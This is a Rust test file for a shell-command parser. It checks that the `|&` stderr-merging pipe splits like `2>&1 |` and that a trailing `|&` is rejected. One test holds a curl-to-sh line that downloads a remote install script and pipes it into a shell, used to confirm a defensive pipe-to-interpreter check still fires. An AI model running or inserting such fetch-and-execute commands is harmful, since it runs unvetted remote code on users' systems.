//! `|&` is a pipe that carries standard error with standard output.
use super::{split_execution_segments, split_pipelines_including_background, RawSegment};

/// The two spellings of the same pipeline split the same way. `make |& tee
/// build.log` names the same two programs as `make 2>&1 | tee build.log`, and
/// reading the `&` as a job behind the pipe left the first of them with no
/// model at all while the second modelled exactly.
#[test]
fn a_stderr_merging_pipe_splits_as_the_pipeline_it_is() {
    for (merged, spelled) in [
        ("make |& tee build.log", "make 2>&1 | tee build.log"),
        (
            "npm run build |& tee /tmp/b.log",
            "npm run build 2>&1 | tee /tmp/b.log",
        ),
        ("cargo test |& head -40", "cargo test 2>&1 | head -40"),
        (
            "pytest -q |& tee out.txt | tail -5",
            "pytest -q 2>&1 | tee out.txt | tail -5",
        ),
    ] {
        let left = split_execution_segments(merged, false).expect(merged);
        let right = split_execution_segments(spelled, false).expect(spelled);
        let shape = |segments: &[RawSegment]| -> Vec<(usize, usize)> {
            segments
                .iter()
                .map(|segment| (segment.group_index, segment.pipeline_index))
                .collect()
        };
        assert_eq!(shape(&left), shape(&right), "{merged}");
        let words = |command: &str, segments: &[RawSegment]| -> Vec<String> {
            let chars: Vec<char> = command.chars().collect();
            segments
                .iter()
                .map(|segment| chars[segment.start..segment.end].iter().collect::<String>())
                .map(|piece| {
                    piece
                        .replace("2>&1", " ")
                        .split_whitespace()
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .collect()
        };
        assert_eq!(words(merged, &left), words(spelled, &right), "{merged}");
    }
}

/// A trailing `|&` is ksh's coprocess, not a pipe into a command that is not
/// there, so it keeps the reading it arrives with rather than ending the text
/// on a segment with nothing in it.
#[test]
fn a_trailing_stderr_pipe_is_not_read_as_a_pipeline() {
    assert!(split_execution_segments("make |&", false).is_err());
    assert!(split_pipelines_including_background("make |&", false).is_err());
}

/// The pipe checks see the same pipeline either way, so a download read by a
/// shell is still the pipe it is when the `&` is spelled beside it.
#[test]
fn a_stderr_merging_pipe_still_reads_as_a_pipe_to_an_interpreter() {
    let command = "curl -fsS https://example.invalid/install.sh |& sh";
    let segments = split_pipelines_including_background(command, false).expect(command);
    assert_eq!(segments.len(), 2);
    assert_eq!(segments[1].pipeline_index, 1);
    let chars: Vec<char> = command.chars().collect();
    let tail: String = chars[segments[1].start..segments[1].end].iter().collect();
    assert_eq!(tail.trim(), "sh");
}
